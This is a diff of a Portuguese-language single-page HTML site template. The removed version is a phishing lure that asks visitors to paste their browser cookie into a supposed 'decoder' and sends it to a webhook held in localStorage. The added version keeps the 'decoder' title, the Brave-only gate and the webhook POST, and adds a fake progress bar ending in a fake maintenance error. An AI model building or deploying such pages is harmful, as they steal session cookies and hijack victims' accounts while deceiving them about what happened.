@@ -1,112 +1,91 @@
+<!-- SITE PUBLICO [SLUG]/INDEX.HTML -->
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Enviar ideia</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      background: #0f0f0f;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .box {
-      background: #1c1c1c;
-      padding: 24px;
-      border-radius: 14px;
-      width: 90%;
-      max-width: 500px;
-    }
-    textarea, button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 12px;
-      border-radius: 10px;
-      border: none;
-      font-size: 14px;
-    }
-    textarea {
-      background: #2a2a2a;
-      color: #fff;
-      resize: none;
-      height: 120px;
-    }
-    button {
-      background: #5865F2;
-      color: #fff;
-      font-weight: bold;
-      cursor: pointer;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Iniciar Decodificador</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{box-sizing:border-box}
+body{
+margin:0;
+background:linear-gradient(135deg,#0f0f0f,#151515);
+font-family:Inter,Arial,sans-serif;
+color:#fff;
+display:flex;
+align-items:center;
+justify-content:center;
+height:100vh;
+}
+.card{
+width:90%;
+max-width:420px;
+background:#1c1c1c;
+border-radius:18px;
+padding:26px;
+text-align:center;
+animation:slide .8s ease;
+}
+@keyframes slide{from{transform:translateY(40px);opacity:0}to{opacity:1}}
+textarea,button{
+width:100%;
+margin-top:14px;
+padding:14px;
+border:none;
+border-radius:12px;
+font-size:14px;
+}
+textarea{background:#2a2a2a;color:#fff;height:120px;resize:none}
+button{
+background:#5865F2;
+color:#fff;
+font-weight:700;
+cursor:pointer;
+}
+.progress{
+width:100%;
+height:10px;
+background:#2a2a2a;
+border-radius:10px;
+overflow:hidden;
+margin-top:20px;
+}
+.bar{
+height:100%;
+width:0;
+background:#5865F2;
+transition:.4s;
+}
+</style>
 </head>
 <body>
-
-  <div class="box" id="app"></div>
-
-  <script>
-    // 🔒 BLOQUEIO FORA DO BRAVE
-    if (!navigator.brave) {
-      document.body.innerHTML = `
-        <div style="
-          background:#0f0f0f;
-          color:#fff;
-          font-family:Arial;
-          height:100vh;
-          display:flex;
-          align-items:center;
-          justify-content:center;
-          text-align:center;
-          padding:20px;
-        ">
-          <div>
-            <h2>Navegador não suportado</h2>
-            <p>Esse site funciona apenas no <b>Brave Browser</b>.</p>
-            <p>Por favor, baixe o brave e entre no site por ele</p>
-          </div>
-        </div>
-      `;
-      throw new Error("Not Brave");
-    }
-
-    // 🧠 LÓGICA DO SITE
-    const nome = location.pathname.replace("/", "");
-    const webhook = localStorage.getItem("webhook_" + nome);
-    const app = document.getElementById("app");
-
-    if (!webhook) {
-      app.innerHTML = `
-        <h3>Site não encontrado</h3>
-        <p>Busque ajuda com quem te mandou o site.</p>
-      `;
-    } else {
-      app.innerHTML = `
-        <h2>Envie o Cookie para Decodificar</h2>
-        <textarea id="msg" placeholder="Preencha"></textarea>
-        <button onclick="enviar()">Enviar</button>
-      `;
-    }
-
-    function enviar() {
-      const msg = document.getElementById("msg").value;
-      if (!msg) return alert("Por favor, preencha");
-
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: msg })
-      });
-
-      app.innerHTML = `
-        <h2>Decodificador V1</h2>
-        <p>Espere o Decodificador Decodificar...</p>
-      `;
-    }
-  </script>
-
+<div class="card" id="app"></div>
+<script>
+if(!navigator.brave){document.body.innerHTML="<h2>Brave only 🚫</h2>";throw 0}
+const slug=location.pathname.replace("/","");
+const hook=localStorage.getItem("webhook_"+slug);
+const app=document.getElementById("app");
+if(!hook){app.innerHTML="<h2>Site inexistente</h2>"}
+else{
+app.innerHTML=`<h2>Envie sua ideia</h2><textarea id='msg'></textarea><button onclick='send()'>Enviar</button>`}
+function send(){
+const m=msg.value;
+if(!m)return alert("escreve algo");
+fetch(hook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:m})});
+app.innerHTML=`<h2>Enviando...</h2><div class='progress'><div class='bar' id='bar'></div></div><p id='txt'>10%</p>`;
+let p=10;
+const i=setInterval(()=>{
+p+=Math.random()*20;
+if(p>=99){
+clearInterval(i);
+txt.innerText="Erro: serviço em manutenção ⚠️";
+bar.style.width="99%";
+return;
+}
+bar.style.width=p+"%";
+txt.innerText=Math.floor(p)+"%";
+},700);
+}
+</script>
 </body>
 </html>
